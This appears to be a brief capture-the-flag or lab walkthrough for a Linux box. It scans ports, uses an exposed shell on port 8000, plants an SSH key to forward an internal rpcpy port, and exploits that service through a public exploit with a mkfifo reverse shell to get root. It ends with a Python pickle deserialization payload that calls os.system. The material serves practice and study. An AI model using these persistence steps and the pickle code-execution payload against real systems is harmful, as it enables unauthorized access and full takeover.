nmap shows ports 22, 8000 open
`ports=$(sudo nmap -Pn -p- --min-rate=1000 -T4 192.168.246.210 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)` also dint reveal anything else

port 8000 is an interractive shell to the system as user user

/opt/rpc.py imports uvicorn and rpcpy 
`ss -tulpn | grep -E '(127.0.0.1:|::1:)'` shows an internal listening port, 65432

No writable services, or any cronjobs
so we setup ssh for the user user, so we can port-forward, and check out the internal port

```zsh
cd ~
mkdir .ssh
cd .ssh
ssh-keygen -f id_rsa
#eter twice for empty passphrase and confirm passphrase
cat id_rsa.pub > authorized_keys
cat id_rsa
```
copy the id_rsa to your kali
```zsh
vi id_rsa
#paste
chmod 600 id_rsa
ssh -L 65432:127.0.0.1:65432 user@192.168.246.210 -i id_rsa_user
```

To understand what these rpcpy and uvicorn is, I google them, and luck by chance, the exploit for rpcpy shows up
https://www.exploit-db.com/exploits/50983

just had to modify the payload with a mkfifo rev shell, and we get root
root!

---
---
---
TODO - lookup this 
```
    class PickleRce(object):
        def __reduce__(self):
            import os
            return os.system, (cmd,)

    payload = pickle.dumps(PickleRce())

    print(payload)
```